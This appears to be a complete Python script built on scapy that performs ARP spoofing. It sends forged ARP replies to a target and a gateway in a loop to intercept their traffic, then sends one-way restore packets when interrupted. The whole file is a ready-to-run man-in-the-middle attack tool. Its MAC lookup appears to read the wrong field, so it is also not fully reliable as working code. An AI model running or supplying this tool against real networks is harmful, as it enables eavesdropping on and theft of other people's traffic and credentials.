#!/usr/bin/env python
import optparse
import scapy.all as scapy
import time
import sys

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Specify the Target IP")
    parser.add_option("-s", "--spoof", "--Gateway", dest="spoof_ip", help="Specify the Spoof or Gateway IP")
    options = parser.parse_args()[0]
    if not options.target_ip:
        parser.error("Please Specify the Target IP, --help for more details")
    elif not options.spoof_ip:
        parser.error("Please Specify the Spoof IP, --help for more details")
    else:
        return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwdst

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip ,hwsrc=spoof_mac)
    scapy.send(packet, verbose=False)

options = get_args()
target_ip = options.target_ip
spoof_ip = options.spoof_ip
spoof(target_ip, spoof_ip)

packet_count = 0
try:
    while True:
        spoof(target_ip, spoof_ip)
        spoof(spoof_ip, target_ip)
        packet_count = packet_count + 2
        print("\r[+] Sent " + str(packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, spoof_ip)
    print("\n[-] Attack is Terminated by KeyboardInterrrupt")
